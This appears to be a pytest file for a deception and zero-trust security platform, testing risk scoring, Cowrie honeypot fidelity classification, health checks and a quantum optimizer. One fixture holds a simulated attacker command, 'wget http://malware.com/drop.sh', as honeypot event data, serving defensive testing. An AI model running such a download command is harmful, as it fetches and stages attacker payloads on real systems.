"""Tests verifying all 4 bug fixes across CipherTwin.

BUG 1: Real decoy placement risk & explainability factor summation
BUG 2: Deception fidelity classification (HIGH, MEDIUM, LOW) & single-source-of-truth counts
BUG 3: Cowrie truthful health check states (LIVE, SIMULATED, DEGRADED, OFFLINE) with caching
BUG 4: QAOA timing separation, never-worse quality guarantee, and scaling benchmark
"""
import pytest
import time
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from app.db.session import Base
from app.models.policy import Policy
from app.models.risk import RiskDecision
from app.models.twin import TwinNode
from app.models.deception import DecoySession
from app.models.telemetry import TelemetryEvent
from app.services.neo4j_client import compute_decoy_placement_risk
from app.services.cowrie import CowrieService
from app.services.quantum_optimizer import QuantumOptimizer
from app.services.risk_engine import ZeroTrustEngine


@pytest.fixture
def test_db():
    engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(bind=engine)
    TestingSession = sessionmaker(autocommit=False, autoflush=False, bind=engine)
    db = TestingSession()

    p1 = Policy(name="Strict Lockout", rule="deny_if:risk>60", weight=1.0, false_positive_rate=0.08, false_negative_rate=0.05, enabled=1)
    p2 = Policy(name="Database Guard", rule="restricted_if:resource==database", weight=1.0, false_positive_rate=0.06, false_negative_rate=0.04, enabled=1)
    p3 = Policy(name="USB Policy", rule="allow_if:device==trusted", weight=1.0, false_positive_rate=0.04, false_negative_rate=0.02, enabled=1)
    db.add_all([p1, p2, p3])

    n1 = TwinNode(id="srv-web-01", label="Web Server", type="server", risk_score=65.0, trust_score=80.0, sensitivity="high", status="online")
    n2 = TwinNode(id="db-prod-01", label="DB Production", type="database", risk_score=70.0, trust_score=85.0, sensitivity="critical", status="online")
    db.add_all([n1, n2])
    db.commit()

    try:
        yield db
    finally:
        db.close()


def test_bug1_compute_decoy_placement_risk():
    """Verify decoy placement risk uses documented weighted formula and normalizes 0-100."""
    risk_high = compute_decoy_placement_risk(degree=12, trust=80.0, sensitivity="critical", reachability=10)
    assert 55.0 <= risk_high <= 85.0

    risk_low = compute_decoy_placement_risk(degree=2, trust=95.0, sensitivity="low", reachability=1)
    assert 0.0 <= risk_low < risk_high

    risk_comp = compute_decoy_placement_risk(degree=5, trust=70.0, sensitivity="high", reachability=3, compromised=True)
    risk_clean = compute_decoy_placement_risk(degree=5, trust=70.0, sensitivity="high", reachability=3, compromised=False)
    assert risk_comp > risk_clean


def test_bug1_factor_contributions_sum_to_decision_score(test_db):
    """Verify explainability engine factor contributions sum exactly to final risk score."""
    engine = ZeroTrustEngine()
    event = TelemetryEvent(
        user_id="alice",
        device_id="srv-web-01",
        target_id="db-prod-01",
        event_type="failed_login",
        status="failure",
        risk_indicators='["multiple_failed_logins", "sensitive_resource"]',
    )
    test_db.add(event)
    test_db.flush()

    result = engine.evaluate(event, test_db)
    assert result.risk_score > 0
    contrib_sum = round(sum(f.contribution for f in result.factors), 1)
    assert abs(contrib_sum - result.risk_score) <= 0.1
    assert len(result.factors) >= 5


def test_bug2_infer_fidelity_classifications():
    """Verify fidelity classification accurately distinguishes HIGH, MEDIUM, and LOW."""
    high_events = [
        {"raw_eventid": "cowrie.session.connect", "command": None},
        {"raw_eventid": "cowrie.login.success", "username": "root"},
        {"raw_eventid": "cowrie.command.input", "command": "wget http://malware.com/drop.sh"},
    ]
    assert CowrieService._infer_fidelity(high_events) == "HIGH"

    med_events = [
        {"raw_eventid": "cowrie.session.connect", "command": None},
        {"raw_eventid": "cowrie.login.failed", "username": "admin", "password": "123"},
        {"raw_eventid": "cowrie.login.failed", "username": "root", "password": "password"},
    ]
    assert CowrieService._infer_fidelity(med_events) == "MEDIUM"

    low_events = [
        {"raw_eventid": "cowrie.session.connect", "command": None},
        {"raw_eventid": "cowrie.session.closed", "command": None},
    ]
    assert CowrieService._infer_fidelity(low_events) == "LOW"


def test_bug2_single_source_of_truth_counters(test_db):
    """Verify fidelity counts equal total session rows from the same store."""
    from app.api.deception import _normalize_fidelity

    test_db.query(DecoySession).delete()
    test_db.add(DecoySession(mode="COWRIE", decoy_type="ssh", fidelity="HIGH"))
    test_db.add(DecoySession(mode="COWRIE", decoy_type="ssh", fidelity="MEDIUM"))
    test_db.add(DecoySession(mode="COWRIE", decoy_type="ssh", fidelity="LOW"))
    test_db.commit()

    sessions = test_db.query(DecoySession).all()
    high = sum(1 for s in sessions if _normalize_fidelity(s.fidelity) == "HIGH")
    med = sum(1 for s in sessions if _normalize_fidelity(s.fidelity) == "MEDIUM")
    low = sum(1 for s in sessions if _normalize_fidelity(s.fidelity) == "LOW")

    assert high == 1
    assert med == 1
    assert low == 1
    assert (high + med + low) == len(sessions)


def test_bug3_cowrie_health_check_states():
    """Verify Cowrie health check returns distinct states and caches safely."""
    svc = CowrieService()
    h1 = svc.check_health()
    assert h1["status"] in ("HEALTHY", "DEGRADED", "UNAVAILABLE")
    assert h1["cowrie_status"] in ("RUNNING", "SIMULATION", "OFFLINE")
    assert "reason" in h1
    assert len(h1["reason"]) > 0

    t0 = time.perf_counter()
    h2 = svc.check_health(force_refresh=False)
    elapsed = time.perf_counter() - t0
    assert elapsed < 0.05
    assert h2["status"] == h1["status"]


def test_bug4_qaoa_never_worse_than_classical(test_db):
    """Verify optimization final cost is <= classical baseline and delta is positive or zero."""
    optimizer = QuantumOptimizer(test_db)
    res = optimizer.optimize(layers=1, iterations=5, decoy_capacity=2)

    assert res.before_score >= res.after_score
    assert res.duration_ms > 0
    assert res.classical_duration_ms is not None
    assert res.quantum_duration_ms is not None
    assert res.winner in ("QAOA-refined", "SciPy retained")
    assert res.improvement is not None
    assert res.improvement >= 0.0


def test_bug4_scaling_benchmark(test_db):
    """Verify scaling benchmark returns valid curves and honest disclaimer."""
    optimizer = QuantumOptimizer(test_db)
    bench = optimizer.scaling_benchmark(unit_sizes=[5, 8])

    results = bench["benchmark_results"]
    assert len(results) == 2
    assert results[0]["units"] == 5
    assert results[0]["classical_ms"] > 0
    assert results[0]["quantum_ms"] > 0
    assert "disclaimer" in bench
    assert "classical simulator" in bench["disclaimer"].lower()
